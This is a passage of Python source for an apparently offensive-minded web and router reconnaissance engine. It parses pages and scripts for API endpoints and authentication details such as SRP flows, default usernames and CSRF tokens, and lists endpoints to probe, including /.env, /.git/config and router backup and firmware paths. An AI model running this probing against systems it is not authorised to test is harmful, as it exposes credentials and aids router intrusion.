            script_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html or "", re.IGNORECASE)
        except Exception as e:
            logger.debug(f"Error extracting script URLs: {e}")
        
        # Fetch external scripts if enabled (with proper resource management)
        if fetch_external and script_urls:
            async with httpx.AsyncClient(
                timeout=httpx.Timeout(8.0, connect=3.0),
                verify=True,  # SSL verification enabled
                limits=httpx.Limits(max_connections=5)
            ) as client:
                for script_url in script_urls[:10]:  # Limit to 10 scripts
                    try:
                        full_url = urllib.parse.urljoin(base_url, script_url)
                        # Skip data URIs and javascript: URLs
                        if full_url.startswith(('data:', 'javascript:', 'blob:')):
                            continue
                        
                        resp = await asyncio.wait_for(
                            client.get(full_url),
                            timeout=5.0
                        )
                        if resp.status_code == 200:
                            # Limit script size to prevent memory issues
                            text = resp.text
                            if text and len(text) < 500000:  # 500KB limit
                                all_js_content.append(text)
                    except asyncio.TimeoutError:
                        logger.debug(f"Timeout fetching script {script_url}")
                    except Exception as e:
                        logger.debug(f"Failed to fetch script {script_url}: {e}")
        
        # Combine all JS content
        combined_js = "\n".join(all_js_content) if all_js_content else ""
        
        if not combined_js:
            return
        
        # Find API endpoints safely
        for pattern in self.JS_API_PATTERNS:
            try:
                matches = re.findall(pattern, combined_js, re.IGNORECASE)
                for match in matches:
                    try:
                        endpoint = match[-1] if isinstance(match, tuple) else match
                        if not endpoint:
                            continue
                        if not endpoint.startswith(("http://", "https://")):
                            endpoint = urllib.parse.urljoin(base_url, endpoint)
                        
                        # Determine method from pattern
                        method = "GET"
                        if isinstance(match, tuple) and len(match) > 1:
                            method_match = match[0].upper() if match[0] in ["get", "post", "put", "delete", "patch"] else "GET"
                            method = method_match
                        
                        result.api_patterns.append({
                            "endpoint": endpoint,
                            "method": method,
                            "source": "javascript",
                            "pattern": pattern[:50],
                        })
                        
                        result.discovered_endpoints.append(DiscoveredEndpoint(
                            url=endpoint,
                            method=method,
                            source="javascript",
                            confidence=0.85,
                        ))
                    except Exception:
                        continue  # Skip malformed matches
            except Exception as e:
                logger.debug(f"Error analyzing JS pattern: {e}")
        
        # Find authentication-related functions safely
        for pattern, func_type in self.JS_FUNCTION_PATTERNS:
            try:
                matches = re.findall(pattern, combined_js, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    try:
                        func_name = match[0] if isinstance(match, tuple) else match
                        if func_name:
                            result.javascript_functions.append({
                                "name": func_name,
                                "type": func_type,
                            })
                    except Exception:
                        continue
            except Exception as e:
                logger.debug(f"Error analyzing JS function pattern: {e}")
    
    def _detect_authentication(
        self, 
        result: ReconnaissanceResult, 
        html: str, 
        headers: Dict[str, str]
    ):
        """Detect authentication mechanism from HTML and headers.
        
        Robust implementation with null-safe operations.
        """
        auth_info = AuthenticationInfo(mechanism=AuthMechanism.UNKNOWN)
        
        # Safely normalize inputs
        html = html or ""
        headers = headers or {}
        combined_content = html.lower()
        
        # Check for each auth mechanism with error handling
        best_match = (AuthMechanism.UNKNOWN, 0.0, [])
        
        for mechanism, patterns in self.AUTH_PATTERNS.items():
            try:
                confidence = 0.0
                evidence = []
                
                for pattern in patterns:
                    try:
                        matches = re.findall(pattern, combined_content, re.IGNORECASE)
                        if matches:
                            confidence += 0.3
                            evidence.extend(matches[:3])
                    except re.error:
                        continue  # Skip invalid regex patterns
                
                if confidence > best_match[1]:
                    best_match = (mechanism, min(confidence, 1.0), evidence)
            except Exception as e:
                logger.debug(f"Error checking auth mechanism {mechanism}: {e}")
        
        auth_info.mechanism = best_match[0]
        auth_info.confidence = best_match[1]
        auth_info.raw_evidence = [str(e)[:100] for e in best_match[2] if e]
        
        # Special handling for SRP (like Vodafone router)
        # Even if SRP wasn't the best match, check for SRP patterns specifically
        srp_detected = auth_info.mechanism == AuthMechanism.SRP
        if not srp_detected:
            # Double-check for SRP patterns that might have been missed
            srp_indicators = [
                r'srp[-_]?min\.js',
                r'srp\.identify',
                r'srp\.success',
                r'srp\.error',
                r'SecureRemotePassword',
            ]
            for pattern in srp_indicators:
                if re.search(pattern, html or "", re.IGNORECASE):
                    srp_detected = True
                    auth_info.mechanism = AuthMechanism.SRP
                    logger.info(f"SRP authentication detected via pattern: {pattern}")
                    break
        
        if srp_detected:
            try:
                # Look for the SRP identify call with endpoint
                # Vodafone format: srp.identify("/authenticate", username, password)
                srp_patterns = [
                    r'srp\.identify\s*\(\s*["\']([^"\']+)["\']',
                    r'srp\.authenticate\s*\(\s*["\']([^"\']+)["\']',
                ]
                for pattern in srp_patterns:
                    srp_match = re.search(pattern, html or "", re.IGNORECASE)
                    if srp_match:
                        auth_info.auth_endpoint = srp_match.group(1)
                        auth_info.srp_details["auth_endpoint"] = srp_match.group(1)
                        logger.info(f"SRP auth endpoint discovered: {srp_match.group(1)}")
                        break
                
                # Find username from hidden field (check both name and id patterns)
                # Vodafone uses: <input type=hidden id="login-txt-uname" value=vodafone>
                username_patterns = [
                    r'<input[^>]+id=["\']?[^"\']*uname[^"\']*["\']?[^>]+value=["\']?([^"\'>\s]+)["\']?',
                    r'<input[^>]+value=["\']?([^"\'>\s]+)["\']?[^>]+id=["\']?[^"\']*uname[^"\']*["\']?',
                    r'<input[^>]+type=["\']?hidden["\']?[^>]+id=["\']?[^"\']*user[^"\']*["\']?[^>]+value=["\']?([^"\'>\s]+)["\']?',
                ]
                for pattern in username_patterns:
                    username_match = re.search(pattern, html or "", re.IGNORECASE)
                    if username_match:
                        auth_info.srp_details["default_username"] = username_match.group(1)
                        logger.info(f"SRP default username found: {username_match.group(1)}")
                        break
            except Exception as e:
                logger.debug(f"Error analyzing SRP details: {e}")
        
        # Look for login form details safely
        try:
            for form in result.discovered_forms or []:
                if form.get("has_password_field") or form.get("is_login_form"):
                    auth_info.mechanism = auth_info.mechanism if auth_info.mechanism != AuthMechanism.UNKNOWN else AuthMechanism.FORM_BASED
                    auth_info.login_endpoint = form.get("full_url")
                    
                    # Check for JS-rendered login form
                    if form.get("js_rendered"):
                        auth_info.login_endpoint = form.get("full_url")
                        if form.get("password_field_id"):
                            auth_info.password_field = form.get("password_field_id")
                        if form.get("username_field_id"):
                            auth_info.username_field = form.get("username_field_id")
                        logger.info(f"JS-rendered login form detected with fields: user={auth_info.username_field}, pass={auth_info.password_field}")
                        break
                    
                    for inp in form.get("inputs", []) or []:
                        try:
                            inp_type = (inp.get("type") or "").lower()
                            inp_name = inp.get("name") or inp.get("id") or ""  # Use id as fallback
                            inp_id = inp.get("id", "").lower()
                            combined = (inp_name + inp_id).lower()
                            
                            if inp_type == "password" or "pass" in combined or "pwd" in combined:
                                auth_info.password_field = inp_name
                            elif inp_type in ("text", "email") or "user" in combined or "email" in combined or "uname" in combined:
                                auth_info.username_field = inp_name
                            elif inp_type == "hidden":
                                auth_info.hidden_fields.append(inp)
                                # Check for CSRF token
                                if inp_name and any(csrf in inp_name.lower() for csrf in ["csrf", "token", "_token"]):
                                    auth_info.csrf_token_name = inp_name
                                    auth_info.csrf_token_value = inp.get("value", "")
                        except Exception:
                            continue
                    break
        except Exception as e:
            logger.debug(f"Error analyzing login forms: {e}")
        
        # Check for CSRF in meta tags safely
        try:
            csrf_meta = (result.meta_info or {}).get("CSRFtoken") or (result.meta_info or {}).get("csrf-token")
            if csrf_meta:
                auth_info.csrf_token_value = csrf_meta
                auth_info.csrf_token_name = "CSRFtoken"
        except Exception:
            pass
        
        # Check headers for auth hints safely
        try:
            headers_lower_keys = {k.lower() for k in headers}
            if "www-authenticate" in headers_lower_keys:
                auth_header = headers.get("WWW-Authenticate", headers.get("www-authenticate", ""))
                if auth_header:
                    auth_header_lower = auth_header.lower()
                    if "basic" in auth_header_lower:
                        auth_info.mechanism = AuthMechanism.BASIC
                    elif "digest" in auth_header_lower:
                        auth_info.mechanism = AuthMechanism.DIGEST
                    elif "bearer" in auth_header_lower:
                        auth_info.mechanism = AuthMechanism.BEARER
        except Exception:
            pass
        
        result.authentication = auth_info
    
    def _detect_security_features(
        self,
        result: ReconnaissanceResult,
        html: str,
        headers: Dict[str, str],
        cookies: List[str] = None
    ):
        """Detect security features from response.
        
        Robust implementation with null-safe operations.
        """
        security = SecurityFeatures()
        
        # Safely normalize inputs
        html = html or ""
        headers = headers or {}
        cookies = cookies or []
        
        try:
            headers_lower = {k.lower(): v for k, v in headers.items() if k and v}
        except Exception:
            headers_lower = {}
        
        # Check security headers
        security.content_security_policy = "content-security-policy" in headers_lower
        if security.content_security_policy:
            security.csp_header = headers_lower.get("content-security-policy", "")
        
        security.x_frame_options = "x-frame-options" in headers_lower
        security.x_content_type_options = "x-content-type-options" in headers_lower
        security.strict_transport_security = "strict-transport-security" in headers_lower
        security.referrer_policy = "referrer-policy" in headers_lower
        
        # Check CORS
        security.cors_configured = "access-control-allow-origin" in headers_lower
        if security.cors_configured:
            security.cors_allow_origin = headers_lower.get("access-control-allow-origin")
        
        # Check rate limiting headers
        rate_limit_headers = ["x-ratelimit-limit", "x-rate-limit", "retry-after", "x-ratelimit-remaining"]
        for header in rate_limit_headers:
            if header in headers_lower:
                security.rate_limiting = True
                security.rate_limit_header = f"{header}: {headers_lower[header]}"
                break
        
        # Check HTML for security features
        for feature, patterns in self.SECURITY_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, html, re.IGNORECASE):
                    if feature == "csrf":
                        security.csrf_protection = True
                        match = re.search(pattern, html, re.IGNORECASE)
                        if match:
                            security.csrf_token_name = match.group(0) if match else None
                    elif feature == "captcha":
                        security.captcha_protection = True
                        if "recaptcha" in pattern:
                            security.captcha_type = "recaptcha"
                        elif "hcaptcha" in pattern:
                            security.captcha_type = "hcaptcha"
                    elif feature == "rate_limit":
                        security.rate_limiting = True
                    elif feature == "lockout":
                        security.brute_force_protection = True
                        security.account_lockout = True
                        # Try to extract lockout duration
                        duration_match = re.search(r'wait\s+(\d+)|(\d+)\s*seconds?', html, re.IGNORECASE)
                        if duration_match:
                            try:
                                result.authentication.lockout_duration = int(duration_match.group(1) or duration_match.group(2))
                            except:
                                pass
                    elif feature == "mfa":
                        if result.authentication:
                            result.authentication.mfa_detected = True
                    break
        
        # Analyze cookies
        if cookies:
            for cookie in cookies:
                cookie_lower = cookie.lower()
                flags = []
                if "httponly" in cookie_lower:
                    flags.append("HttpOnly")
                if "secure" in cookie_lower:
                    flags.append("Secure")
                if "samesite" in cookie_lower:
                    flags.append("SameSite")
                
                # Extract cookie name
                cookie_name = cookie.split("=")[0].strip() if "=" in cookie else cookie
                security.cookie_flags[cookie_name] = flags
        
        result.security_features = security
    
    def _extract_interesting_strings(self, result: ReconnaissanceResult, html: str):
        """Extract potentially interesting strings from HTML."""
        patterns = [
            # API keys and tokens (be careful - just patterns, not actual secrets)
            r'["\'][a-zA-Z0-9]{32,}["\']',  # Long alphanumeric strings
            # Internal IPs
            r'(?:192\.168|10\.\d+|172\.(?:1[6-9]|2\d|3[01]))\.\d+\.\d+',
            # Email addresses
            r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            # Version numbers
            r'(?:version|ver|v)["\s:=]+(\d+\.\d+(?:\.\d+)?)',
            # File paths
            r'["\'](?:/[\w./]+\.\w+|C:\\[\w\\]+\.\w+)["\']',
            # Debug/test flags
            r'(?:debug|test|dev)(?:Mode|Enabled|Flag)?\s*[=:]\s*(?:true|1|yes)',
            # Environment hints
            r'(?:production|staging|development|localhost)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches[:5]:  # Limit matches per pattern
                if len(match) > 3 and match not in result.interesting_strings:
                    result.interesting_strings.append(match)
    
    def _extract_comments(self, result: ReconnaissanceResult, html: str):
        """Extract HTML comments that might reveal information."""
        # HTML comments
        comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
        
        # Filter interesting comments
        interesting_keywords = [
            "todo", "fixme", "hack", "bug", "password", "secret", "api",
            "debug", "test", "admin", "root", "config", "disabled", "removed"
        ]
        
        for comment in comments:
            comment = comment.strip()
            if len(comment) > 10:  # Skip very short comments
                comment_lower = comment.lower()
                if any(kw in comment_lower for kw in interesting_keywords):
                    result.comments.append(comment[:200])  # Truncate long comments
    
    def _detect_technologies(
        self, 
        result: ReconnaissanceResult, 
        html: str, 
        headers: Dict[str, str]
    ):
        """Detect technologies from various hints."""
        hints = []
        
        # From headers
        if "x-powered-by" in {k.lower() for k in headers}:
            hints.append(f"Powered by: {headers.get('X-Powered-By', headers.get('x-powered-by', ''))}")
        if "server" in {k.lower() for k in headers}:
            hints.append(f"Server: {headers.get('Server', headers.get('server', ''))}")
        
        # From HTML patterns
        tech_patterns = [
            (r'wp-content|wp-includes', "WordPress"),
            (r'drupal', "Drupal"),
            (r'joomla', "Joomla"),
            (r'react', "React"),
            (r'angular', "Angular"),
            (r'vue\.js|vuejs', "Vue.js"),
            (r'jquery', "jQuery"),
            (r'bootstrap', "Bootstrap"),
            (r'tailwind', "Tailwind CSS"),
            (r'next\.js|nextjs|_next', "Next.js"),
            (r'nuxt', "Nuxt.js"),
            (r'laravel', "Laravel"),
            (r'django', "Django"),
            (r'flask', "Flask"),
            (r'express', "Express.js"),
            (r'asp\.net|aspnet', "ASP.NET"),
            (r'ruby on rails|rails', "Ruby on Rails"),
            (r'spring', "Spring"),
        ]
        
        for pattern, tech in tech_patterns:
            if re.search(pattern, html, re.IGNORECASE):
                hints.append(tech)
        
        # From script sources
        script_hints = {
            "google-analytics": "Google Analytics",
            "gtag": "Google Tag Manager",
            "facebook": "Facebook SDK",
            "cloudflare": "Cloudflare",
            "cdn": "CDN detected",
        }
        
        for pattern, tech in script_hints.items():
            if pattern in html.lower():
                hints.append(tech)
        
        result.technology_hints = list(set(hints))
    
    def _identify_potential_vulnerabilities(
        self,
        result: ReconnaissanceResult,
        html: str,
        headers: Dict[str, str]
    ):
        """Identify potential vulnerabilities based on reconnaissance."""
        vulns = []
        
        # Missing security headers
        headers_lower = {k.lower() for k in headers}
        if "content-security-policy" not in headers_lower:
            vulns.append("Missing Content-Security-Policy header")
        if "x-frame-options" not in headers_lower:
            vulns.append("Missing X-Frame-Options header (potential clickjacking)")
        if "x-content-type-options" not in headers_lower:
            vulns.append("Missing X-Content-Type-Options header")
        
        # CORS issues
        if result.security_features and result.security_features.cors_allow_origin == "*":
            vulns.append("Permissive CORS policy (Access-Control-Allow-Origin: *)")
        
        # No CSRF protection on forms
        if result.discovered_forms:
            forms_without_csrf = [
                f for f in result.discovered_forms 
                if f.get("method", "").upper() == "POST" and not any(
                    "csrf" in (h.get("name", "") or "").lower() or "token" in (h.get("name", "") or "").lower()
                    for h in f.get("inputs", []) if h.get("type") == "hidden"
                )
            ]
            if forms_without_csrf:
                vulns.append(f"POST forms without CSRF protection: {len(forms_without_csrf)}")
        
        # Information disclosure in comments
        if result.comments:
            vulns.append(f"HTML comments may disclose sensitive info: {len(result.comments)} found")
        
        # Debug mode indicators
        if any("debug" in s.lower() for s in result.interesting_strings):
            vulns.append("Debug mode may be enabled")
        
        # Version disclosure
        if any("version" in h.lower() for h in result.technology_hints):
            vulns.append("Server version disclosure in headers")
        
        # No rate limiting on auth endpoints
        if result.authentication and result.authentication.login_endpoint:
            if not (result.security_features and result.security_features.rate_limiting):
                vulns.append("Login endpoint may lack rate limiting")
        
        # Weak authentication
        if result.authentication:
            if result.authentication.mechanism == AuthMechanism.BASIC:
                vulns.append("Basic authentication detected (credentials sent in clear text)")
            if not result.authentication.csrf_token_value:
                vulns.append("No CSRF protection on authentication")
        
        result.potential_vulnerabilities = vulns


# Global enhanced reconnaissance engine
_recon_engine = EnhancedReconnaissanceEngine()


async def perform_enhanced_reconnaissance(
    target_url: str,
    html_content: str,
    headers: Dict[str, str],
    cookies: List[str] = None,
    fetch_scripts: bool = True,
) -> ReconnaissanceResult:
    """Convenience function to perform enhanced reconnaissance."""
    return await _recon_engine.perform_reconnaissance(
        target_url=target_url,
        html_content=html_content,
        headers=headers,
        cookies=cookies,
        fetch_scripts=fetch_scripts,
    )


# =============================================================================
# INTELLIGENT ACTIVE RECONNAISSANCE ENGINE
# =============================================================================

@dataclass
class ProbeResult:
    """Result of an active probe."""
    endpoint: str
    method: str
    status_code: int
    response_time_ms: float
    headers: Dict[str, str]
    content_type: Optional[str] = None
    content_length: int = 0
    body_preview: str = ""
    redirects: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    behaviors: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class AuthFlowStep:
    """A step in a multi-step authentication flow."""
    order: int
    endpoint: str
    method: str
    required_parameters: List[str]
    expected_response: str  # "token", "redirect", "challenge", etc.
    produces: List[str]  # What this step produces (tokens, cookies, etc.)


@dataclass
class IntelligentReconResult:
    """Results from intelligent active reconnaissance."""
    target_url: str
    passive_recon: Optional[ReconnaissanceResult] = None
    
    # Active probing results
    common_endpoint_probes: List[ProbeResult] = field(default_factory=list)
    api_version_detected: Optional[str] = None
    api_documentation_url: Optional[str] = None
    
    # Authentication flow analysis
    auth_flow_steps: List[AuthFlowStep] = field(default_factory=list)
    auth_flow_complexity: str = "unknown"  # simple, multi-step, challenge-response
    
    # Error behavior analysis
    error_responses: Dict[str, str] = field(default_factory=dict)  # status_code -> behavior
    error_disclosure_level: str = "unknown"  # verbose, minimal, none
    
    # Rate limiting behavior
    rate_limit_threshold: Optional[int] = None
    rate_limit_window_seconds: Optional[int] = None
    rate_limit_bypass_possible: bool = False
    
    # Session behavior
    session_mechanism: str = "unknown"  # cookie, token, hybrid
    session_token_location: Optional[str] = None  # cookie, header, body
    session_timeout_seconds: Optional[int] = None
    
    # Server behavior fingerprint
    server_quirks: List[str] = field(default_factory=list)
    waf_detected: bool = False
    waf_type: Optional[str] = None
    
    # Attack surface summary
    high_value_targets: List[Dict[str, Any]] = field(default_factory=list)
    recommended_techniques: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "target_url": self.target_url,
            "passive_recon": self.passive_recon.to_dict() if self.passive_recon else None,
            "api_version_detected": self.api_version_detected,
            "api_documentation_url": self.api_documentation_url,
            "auth_flow_steps": [asdict(s) for s in self.auth_flow_steps],
            "auth_flow_complexity": self.auth_flow_complexity,
            "error_disclosure_level": self.error_disclosure_level,
            "rate_limit_threshold": self.rate_limit_threshold,
            "rate_limit_window_seconds": self.rate_limit_window_seconds,
            "session_mechanism": self.session_mechanism,
            "waf_detected": self.waf_detected,
            "waf_type": self.waf_type,
            "high_value_targets": self.high_value_targets,
            "recommended_techniques": self.recommended_techniques,
            "server_quirks": self.server_quirks,
        }


class IntelligentReconnaissanceEngine:
    """
    Highly intelligent reconnaissance engine that combines:
    1. Passive analysis (HTML, JS, headers)
    2. Active probing (common endpoints, error analysis)
    3. Behavioral analysis (auth flow, rate limiting, error disclosure)
    4. Protocol understanding (SRP, OAuth, JWT flows)
    
    This engine thinks like a security researcher:
    - First observes silently
    - Then probes carefully  
    - Understands multi-step flows
    - Infers server behavior from responses
    - Recommends attack strategies based on findings
    """
    
    # Common endpoints to probe
    COMMON_ENDPOINTS = [
        # Authentication
        "/login", "/signin", "/auth", "/authenticate", "/api/auth", "/api/login",
        "/oauth/authorize", "/oauth/token", "/oauth2/authorize", "/oauth2/token",
        "/logout", "/signout", "/api/logout",
        "/register", "/signup", "/api/register",
        "/forgot-password", "/reset-password", "/api/password/reset",
        
        # API discovery
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/graphql", "/graphql/console", "/graphiql",
        "/swagger", "/swagger.json", "/swagger.yaml",
        "/openapi", "/openapi.json", "/openapi.yaml",
        "/docs", "/api-docs", "/api/docs",
        "/redoc", "/rapidoc",
        
        # Admin/management
        "/admin", "/administrator", "/manage", "/management",
        "/dashboard", "/console", "/portal",
        "/config", "/settings", "/preferences",
        
        # Debug/development
        "/debug", "/test", "/dev", "/development",
        "/actuator", "/actuator/health", "/actuator/info",
        "/health", "/healthcheck", "/status", "/ping",
        "/.well-known/openid-configuration",
        
        # Common files
        "/robots.txt", "/sitemap.xml", "/.git/config",
        "/package.json", "/composer.json", "/web.config",
        "/.env", "/config.json", "/settings.json",
        
        # Error pages
        "/error", "/404", "/500", "/forbidden",
        
        # ============================================
        # ROUTER/EMBEDDED DEVICE SPECIFIC ENDPOINTS
        # ============================================
        # Common router API endpoints
        "/cgi-bin/", "/goform/", "/apply.cgi", "/setup.cgi",
        "/json", "/data", "/jrd", "/api/system", "/api/device",
        "/cgi", "/htdocs/", "/usr/www/", "/www/",
        
        # Router status/info pages
        "/status.html", "/info.html", "/system.html", "/network.html",
        "/cgi-bin/status", "/cgi-bin/info", "/cgi-bin/system",
        "/webapi/", "/rpc/", "/jsonrpc", "/xmlrpc",
        
        # Router configuration endpoints
        "/cgi-bin/config", "/cgi-bin/settings", "/cgi-bin/backup",
        "/backup.cfg", "/config.cfg", "/settings.cfg",
        "/export", "/import", "/upgrade", "/firmware",
        "/cgi-bin/firmware", "/update", "/upload",
        
        # SRP/Auth specific endpoints (Vodafone/Huawei/etc)
        "/api/auth/identify", "/api/auth/authenticate",
        "/api/user/state", "/api/user/session",
        "/api/ntwk", "/api/xdsl", "/api/wlan", "/api/dhcp",
        "/authenticate", "/identify", "/session",
        "/srp/identify", "/srp/authenticate", "/srp/challenge",
        # Vodafone-specific endpoints
        "/login.lp", "/login.lp?getSessionStatus=true", "/login.lp?action=getcsrf",
        "/login.lp?action=getLangCode",
        
        # Common router vendor-specific paths
        "/HNAP1/", "/hnap/", "/HNAP/",  # D-Link/Cisco
        "/ubus/", "/luci/", "/cgi-bin/luci",  # OpenWrt/LEDE
        "/tr069", "/cwmp", "/deviceinfo",  # TR-069
        "/api/v2/session", "/api/v2/system/info",
        "/web/device", "/web/network", "/web/wan",
        
        # JavaScript app common endpoints
        "/index.html", "/main.html", "/home.html", "/app.html",
        "/static/", "/assets/", "/js/", "/scripts/",
        "/#/login", "/#/home", "/#/dashboard",
    ]
    
    # Router/IoT device specific login UI patterns (JavaScript-rendered)
    # These are GENERAL patterns that work across vendors, not vendor-specific
    JS_LOGIN_UI_PATTERNS = {
        "login_forms": [
            # Div-based login containers
            r'<div[^>]+(?:id|class)=["\'][^"\']*(?:login|signin|auth)[^"\']*["\']',
            r'<div[^>]+(?:id|class)=["\'][^"\']*(?:loginForm|login-form|login_form)[^"\']*["\']',
            r'<div[^>]+(?:id|class)=["\'][^"\']*(?:authBox|auth-box|auth_container)[^"\']*["\']',
            # Input fields with login-related IDs
            r'<input[^>]+(?:id|name)=["\'][^"\']*(?:username|user|login|uname)[^"\']*["\']',
            r'<input[^>]+(?:id|name)=["\'][^"\']*(?:password|passwd|pass|pwd)[^"\']*["\']',
            # Login buttons
            r'<(?:button|input)[^>]+(?:id|name|class)=["\'][^"\']*(?:login|submit|signin|logIn)[^"\']*["\']',
        ],
        "js_auth_init": [
            # Angular/Vue/React router login components
            r"route.*['\"](?:/login|/signin|/auth)['\"]",
            r"component.*['\"](?:Login|SignIn|Auth)",
            # Dynamic login rendering
            r"render(?:Login|Auth|SignIn)",
            r"show(?:Login|Auth)(?:Modal|Form|Page)",
            r"init(?:Login|Auth)",
            # Auth library initialization - GENERAL PATTERN
            # Catches: srp = new SRP(), auth = new AuthLib(), etc
            r"(\w+)\s*=\s*new\s+(?:SRP|Auth|Login|Authenticator|PAKE|SPAKE|Argon|bcrypt)",
            r"new\s+(?:SRP|Auth|PAKE|SPAKE)\s*\(",
            # Auth object method calls - GENERAL
            # Catches: auth.init(), srp.create(), login.setup()
            r"\w+\s*\.\s*(?:init|create|setup|configure)\s*\(",
        ],
        "router_ui_patterns": [
            # Common router vendors (lowercase for case-insensitive matching)
            r"vodafone|huawei|sagemcom|technicolor|netgear|dlink|d-link|tp-link|tplink|asus|zyxel|linksys|cisco|ubiquiti|mikrotik|arris|motorola",
            # Generic router/gateway UI patterns
            r"router(?:login|ui|admin|portal)?",
            r"gateway(?:admin|portal|ui)?",
            r"modem(?:admin|portal|ui)?",
            r"wifi(?:hub|box|router)",
            # Common SPA framework patterns (indicates JS-rendered UI)
            r"ng-?(?:app|controller|model|view|click)",  # Angular
            r"v-(?:model|bind|on|if|for|show)",  # Vue
            r"data-react|__react",  # React
            r"app-root|#app|\$app",
            # Hidden username fields (common in router UIs)
            r'<input[^>]+type=["\']?hidden["\']?[^>]+(?:user|uname|login)[^>]+value=["\']?(\w+)["\']?',
            r'default(?:User|Username|Login)\s*[=:]\s*["\'](\w+)["\']',
        ],
        "auth_library_indicators": [
            # SRP (Secure Remote Password) - used by many vendors
            r'srp[-_]?(?:min|lib|client|auth)?\.js',
            r'SecureRemotePassword|srp\.(?:identify|authenticate|challenge)',
            # Other auth protocols
            r'(?:pake|spake|opaque|scram)[-_]?(?:lib|client)?\.js',
            r'bcrypt|argon2|scrypt',
            r'sha256|sha512|pbkdf2',
            # OAuth/OpenID  
            r'oauth|openid|oidc',
            # JWT handling
            r'jsonwebtoken|jwt[-_]decode',
        ],
        "hidden_credential_fields": [
            # Hidden inputs that might contain default usernames or tokens
            r'<input[^>]+type=["\']?hidden["\']?[^>]+value=["\']?([a-zA-Z0-9_-]+)["\']?[^>]*>',
            r'default(?:User|Password|Credential)\s*[=:]\s*["\']([^"\']+)["\']',
            # CSRF tokens and session identifiers
            r'<meta[^>]+name=["\']?(?:csrf|_csrf|xsrf)[^"\']*["\']?[^>]+content=["\']?([^"\']+)["\']?',
            r'csrf(?:Token|_token)?\s*[=:]\s*["\']([^"\']+)["\']',
        ],
    }
    
    # WAF signatures
    WAF_SIGNATURES = {
        "cloudflare": ["cf-ray", "__cfduid", "cf-request-id"],
        "aws_waf": ["x-amzn-requestid", "x-amz-cf-id"],
        "akamai": ["akamai", "x-akamai-request-id"],
        "imperva": ["incap_ses", "_incapsula_"],
        "f5_big_ip": ["bigipserver", "f5"],
        "fortinet": ["fortigate", "fortiweb"],
        "modsecurity": ["mod_security", "modsecurity"],
        "sucuri": ["sucuri", "x-sucuri-id"],
    }
    
    # Authentication library patterns - GENERAL PURPOSE
    # Detects auth protocols and extracts endpoints from ANY auth library
    AUTH_LIBRARY_PATTERNS = {
        # SRP (Secure Remote Password) - common in routers
        "srp_library": [
            r'srp[-_]?(?:min|lib|client)?\.js',
            r'SecureRemotePassword|SRP6a?',
            r'srpClient',
        ],
        "srp_init": [
            r'(?:var|let|const)?\s*(?:srp|auth|client)\s*=\s*new\s+(?:SRP|Auth|Client)\s*\(',
            r'(?:SRP|Auth)\s*\.\s*(?:init|create|setup)\s*\(',
        ],
        # GENERAL: Any object.method("/path", ...) that looks like auth
        "auth_method_calls": [
            # obj.identify|authenticate|login|signin|verify("/endpoint", ...)
            r'(\w+)\s*\.\s*(?:identify|authenticate|login|signin|verify|validate|auth)\s*\(\s*["\']([^"\']+)["\']',
            # Auth.method("/endpoint")
            r'(?:Auth|SRP|Login|Session)\s*\.\s*(\w+)\s*\(\s*["\']([^"\']+)["\']',
        ],
        # Challenge-response patterns (common in crypto auth)
        "challenge_response": [
            r'["\']?challenge["\']?\s*:',
            r'["\']?salt["\']?\s*:\s*["\'][0-9a-fA-F]+["\']',
            r'["\']?(?:serverKey|publicKey|B)["\']?\s*:\s*["\'][0-9a-fA-F]+["\']',
            r'["\']?(?:proof|M2|verifier)["\']?\s*:',
        ],
        # Callback/handler patterns that might contain endpoints
        "auth_callbacks": [
            r'(?:on|handle)(?:Login|Auth|Success|Error)\s*[=:]\s*function',
            r'\.(?:success|error|done|fail)\s*\(\s*function',
            r'\.then\s*\(\s*(?:function|response|\()',
        ],
        # URL/endpoint variable assignments related to auth
        "auth_url_vars": [
            r'(?:auth|login|session|token|identify|authenticate)(?:Url|URL|Endpoint|Path)\s*[=:]\s*["\']([^"\']+)["\']',
            r'(?:API|ENDPOINT|URL)\s*\.\s*(?:AUTH|LOGIN|SESSION)\s*[=:]\s*["\']([^"\']+)["\']',
        ],
    }

    def __init__(self):
        self.passive_engine = EnhancedReconnaissanceEngine()
        self.probe_cache: Dict[str, ProbeResult] = {}
        self._http_client: Optional[httpx.AsyncClient] = None
        self._client_lock = asyncio.Lock()
    
    async def _get_client(self) -> httpx.AsyncClient:
        """Get or create HTTP client with proper thread safety."""
        async with self._client_lock:
            if self._http_client is None or self._http_client.is_closed:
                self._http_client = httpx.AsyncClient(
                    timeout=httpx.Timeout(60.0, connect=15.0),  # Increased timeout for robustness
                    follow_redirects=False,
                    verify=True,  # SSL verification enabled
                    limits=httpx.Limits(max_connections=20, max_keepalive_connections=10),
                )
            return self._http_client
    
    async def cleanup(self):
        """Clean up HTTP client resources."""
        async with self._client_lock:
            if self._http_client and not self._http_client.is_closed:
                await self._http_client.aclose()
                self._http_client = None
    
    async def perform_intelligent_recon(
        self,
        target_url: str,
        html_content: str,
        headers: Dict[str, str],
        cookies: List[str] = None,
        active_probing: bool = True,
        probe_depth: str = "normal",  # minimal, normal, aggressive
    ) -> IntelligentReconResult:
        """
        Perform comprehensive intelligent reconnaissance.
        
        This method is designed to be robust and handle:
        - Network failures gracefully
        - Malformed HTML/responses
        - Timeouts and slow servers
        - SSL/TLS errors
        - Missing or null data
        
        Args:
            target_url: Base URL to analyze
            html_content: Initial HTML content (can be empty/None)
            headers: Response headers from initial request (can be empty)
            cookies: Cookies from initial response (optional)
            active_probing: Whether to actively probe endpoints
            probe_depth: How aggressive to be with probing
            
        Returns:
            IntelligentReconResult with comprehensive findings (never None)
        """
        result = IntelligentReconResult(target_url=target_url)
        
        # Normalize inputs to prevent None errors
        html_content = html_content or ""
        headers = headers or {}
        cookies = cookies or []
        
        # Step 1: Passive reconnaissance with error handling
        try:
            result.passive_recon = await asyncio.wait_for(
                self.passive_engine.perform_reconnaissance(
                    target_url=target_url,
                    html_content=html_content,
